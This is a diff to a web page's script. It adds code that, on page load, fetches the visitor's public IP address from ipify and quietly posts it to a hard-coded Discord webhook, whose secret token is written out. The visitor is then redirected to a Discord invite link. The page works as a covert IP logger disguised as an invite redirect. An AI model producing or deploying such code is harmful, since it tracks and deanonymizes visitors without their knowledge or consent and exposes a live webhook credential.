@@ -10,19 +10,28 @@
 </head>
 <body>
     <script>
-        var ip = 'IP';
-        fetch('https://discord.com/api/webhooks/1217465990842024017/n1QPNHUP7amDOhzkpOhUPi8X3L6bLHZgCOe8xxyDlYDfp9AjKvydI302xDnLF4H13hxU', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ ip: ip })
-        })
-        .then(response => {
-            setTimeout(function() {
-                window.location.replace('https://discord.gg/5ch'); 
-            }, 2000);
-        });
+        function getIpAddress() {
+            fetch('https://api64.ipify.org?format=json') 
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                var webhookUrl = 'https://discord.com/api/webhooks/1217465990842024017/n1QPNHUP7amDOhzkpOhUPi8X3L6bLHZgCOe8xxyDlYDfp9AjKvydI302xDnLF4H13hxU'; 
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ ip: ip })
+                })
+                .then(response => {
+                    setTimeout(function() {
+                        window.location.replace('https://discord.gg/5ch'); 
+                    }, 2000);
+                });
+            });
+        }
+
+        getIpAddress(); 
     </script>
 </body>
 </html>
